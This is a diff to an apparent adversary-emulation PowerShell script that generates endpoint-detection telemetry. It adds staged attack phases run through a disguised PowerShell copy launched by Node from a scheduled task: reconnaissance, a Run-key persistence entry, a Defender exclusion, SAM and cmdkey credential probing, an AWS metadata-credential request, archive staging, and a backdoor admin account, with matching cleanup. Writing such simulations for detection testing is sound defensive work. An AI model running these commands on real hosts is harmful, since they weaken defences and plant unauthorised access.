@@ -12,9 +12,17 @@
 #     3. Generate an RSA SSH key pair and known_hosts file under ~/.ssh.
 #     4. Copy powershell.exe to C:\ProgramData\wt.exe (binary masquerade).
 #     5. Via a scheduled task, run node.exe which launches wt.exe, which:
-#          a. Sets a registry Run key for persistence (MicrosoftUpdate).
-#          b. Drops a staged payload file at C:\TEMP\stage2.ps1.
-#          c. Spawns ssh.exe targeting 192.0.2.1 (lateral movement simulation).
+#          a. Runs initial recon: whoami, net user, net localgroup, ipconfig.
+#          b. Sets a registry Run key for persistence (MicrosoftUpdate).
+#          c. Adds a Windows Defender exclusion for C:\TEMP (defense evasion).
+#          d. Drops a staged payload file at C:\TEMP\stage2.ps1.
+#          e. Attempts SAM registry query (access denied) -- pivots to app credentials.
+#          f. Runs cmdkey to enumerate stored network credentials.
+#          g. Creates fake AWS credentials at ~/.aws/credentials.
+#          h. Probes the AWS IMDS endpoint (cloud environment discovery).
+#          i. Spawns ssh.exe targeting 192.0.2.1 (lateral movement simulation).
+#          j. Stages fake sensitive files and compresses them to C:\TEMP\exfil.zip.
+#          k. Creates a backdoor local account (svc_backup) with admin rights.
 #     6. Send an outbound HTTP POST to 192.0.2.1:8000 via Node.js (C2 beacon).
 #
 #   All activity is benign. The Windows host should have Elastic Agent with
@@ -187,7 +195,13 @@ Remove-ItemProperty -Path $regPath -Name $regValueName -ErrorAction SilentlyCont
 if (Test-Path $maskedExe) {
     Remove-Item -Path $maskedExe -Force -ErrorAction SilentlyContinue
 }
-Write-Status -Action "Artifact Cleanup" -Status "SUCCESS" -Detail "Removed registry key '$regValueName' and $maskedExe"
+$awsCredPath = Join-Path $env:USERPROFILE ".aws\credentials"
+if (Test-Path $awsCredPath) { Remove-Item -Path $awsCredPath -Force -ErrorAction SilentlyContinue }
+if (Test-Path "C:\TEMP\staging")  { Remove-Item -Path "C:\TEMP\staging"  -Recurse -Force -ErrorAction SilentlyContinue }
+if (Test-Path "C:\TEMP\exfil.zip") { Remove-Item -Path "C:\TEMP\exfil.zip" -Force -ErrorAction SilentlyContinue }
+net user svc_backup /delete 2>$null | Out-Null
+Remove-MpPreference -ExclusionPath "C:\TEMP" -ErrorAction SilentlyContinue
+Write-Status -Action "Artifact Cleanup" -Status "SUCCESS" -Detail "Removed registry key '$regValueName', $maskedExe, AWS credentials, staging files, backdoor account, and AV exclusion"
 
 # ------------------------------------------------------------------------------
 # 5. SCHEDULED TASK EXECUTION ON WINDOWS HOST
@@ -195,13 +209,43 @@ Write-Status -Action "Artifact Cleanup" -Status "SUCCESS" -Detail "Removed regis
 Copy-Item -Path "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Destination $maskedExe -Force
 
 $script = {
+    # Phase 1: Recon - understand the environment before taking action
+    Start-Process -FilePath "whoami.exe"   -ArgumentList "/all"                     -WindowStyle Hidden -Wait
+    Start-Process -FilePath "net.exe"      -ArgumentList "user"                     -WindowStyle Hidden -Wait
+    Start-Process -FilePath "net.exe"      -ArgumentList "localgroup administrators" -WindowStyle Hidden -Wait
+    Start-Process -FilePath "ipconfig.exe" -ArgumentList "/all"                     -WindowStyle Hidden -Wait
+
+    # Phase 2: Persistence - establish foothold before anything risky
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftUpdate" -Value "C:\ProgramData\wt.exe" -Force
 
     if (-not (Test-Path "C:\TEMP")) {
         New-Item -ItemType Directory -Path "C:\TEMP" | Out-Null
     }
+
+    # Phase 3: Defense evasion - add AV exclusion so next-stage payload lands unscanned
+    Add-MpPreference -ExclusionPath "C:\TEMP" -ErrorAction SilentlyContinue
+
+    # Drop stage-2 payload into the now-excluded directory
     Set-Content -Path "C:\TEMP\stage2.ps1" -Value "# Stage 2 Payload" -Force
 
+    # Phase 4: Credential access - attempt SAM hive (blocked), pivot to app credentials
+    Start-Process -FilePath "reg.exe"     -ArgumentList "query HKLM\SAM"           -WindowStyle Hidden -Wait
+    Start-Process -FilePath "cmdkey.exe"  -ArgumentList "/list"                    -WindowStyle Hidden -Wait
+
+    # Found AWS credentials in the compromised app source - write them for later use
+    $awsDir = Join-Path $env:USERPROFILE ".aws"
+    if (-not (Test-Path $awsDir)) { New-Item -ItemType Directory -Path $awsDir -Force | Out-Null }
+    Set-Content -Path (Join-Path $awsDir "credentials") -Value @(
+        "[default]",
+        "aws_access_key_id = AKIAIOSFODNN7EXAMPLE",
+        "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+        "region = us-east-1"
+    ) -Force
+
+    # Phase 5: Cloud discovery - probe IMDS to determine if running in AWS
+    Invoke-WebRequest -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -TimeoutSec 2 -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+
+    # Phase 6: Lateral movement - attempt SSH using harvested credentials
     $sshExe = '##SSHEXE##'
     if ($sshExe -and (Test-Path $sshExe)) {
         $sshProc = Start-Process -FilePath $sshExe -ArgumentList @(
@@ -213,16 +257,26 @@ $script = {
         Start-Sleep -Seconds 4
         if ($null -ne $sshProc -and -not $sshProc.HasExited) { $sshProc.Kill() }
     }
+
+    # Phase 7: Collection - stage sensitive files and compress for exfil
+    $stageDir = "C:\TEMP\staging"
+    if (-not (Test-Path $stageDir)) { New-Item -ItemType Directory -Path $stageDir -Force | Out-Null }
+    Set-Content -Path "$stageDir\db_config.json" -Value '{"host":"prod-db.internal","user":"app_svc","password":"S3cr3tP@ss!"}' -Force
+    Set-Content -Path "$stageDir\api_keys.txt" -Value "STRIPE_KEY=sk_live_EXAMPLE`nSENDGRID_KEY=SG.EXAMPLE`nTWILIO_SID=ACEXAMPLE" -Force
+    Compress-Archive -Path $stageDir -DestinationPath "C:\TEMP\exfil.zip" -Force
+
+    # Phase 8: Persistence escalation - create backdoor account with admin rights
+    Start-Process -FilePath "net.exe" -ArgumentList @("user", "svc_backup", "P@ssw0rd123", "/add")        -WindowStyle Hidden -Wait
+    Start-Process -FilePath "net.exe" -ArgumentList @("localgroup", "administrators", "svc_backup", "/add") -WindowStyle Hidden -Wait
 }
 
 $scriptText = $script.ToString().Replace('##SSHEXE##', $(if ($sshExePath) { $sshExePath } else { '' }))
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($scriptText)
 $encodedCommand = [Convert]::ToBase64String($bytes)
 
-$cmdLine = "C:\\ProgramData\\wt.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand $encodedCommand"
-
-# Changed from exec to execSync to force Node to wait for wt.exe
-$nodeScript = "require('child_process').execSync('$cmdLine')"
+# spawnSync bypasses cmd.exe (execSync routes through cmd.exe, which has an 8191-char limit —
+# exceeded now that the encoded payload is larger). spawnSync calls CreateProcess directly (32767-char limit).
+$nodeScript = "require('child_process').spawnSync('C:\\ProgramData\\wt.exe',['-ExecutionPolicy','Bypass','-NoProfile','-EncodedCommand','$encodedCommand'],{stdio:'ignore',timeout:60000})"
 
 $nodePayloadPath = Join-Path $env:TEMP "malicious_app.js"
 Set-Content -Path $nodePayloadPath -Value $nodeScript -Force
@@ -231,8 +285,8 @@ $action = New-ScheduledTaskAction -Execute "node.exe" -Argument "`"$nodePayloadP
 Register-ScheduledTask -TaskName "NodeDemoService" -Action $action -User $env:USERNAME -Force | Out-Null
 Start-ScheduledTask -TaskName "NodeDemoService"
 
-# Keeps the overall execution orderly before Section 7
-Start-Sleep -Seconds 12
+# Wait for wt.exe to complete all phases (recon + evasion + creds + SSH + staging + account)
+Start-Sleep -Seconds 35
 
 Unregister-ScheduledTask -TaskName "NodeDemoService" -Confirm:$false | Out-Null
 Write-Status -Action "Service Simulation" -Status "SUCCESS" -Detail "Spawned Node.js as a background service via Scheduled Task"
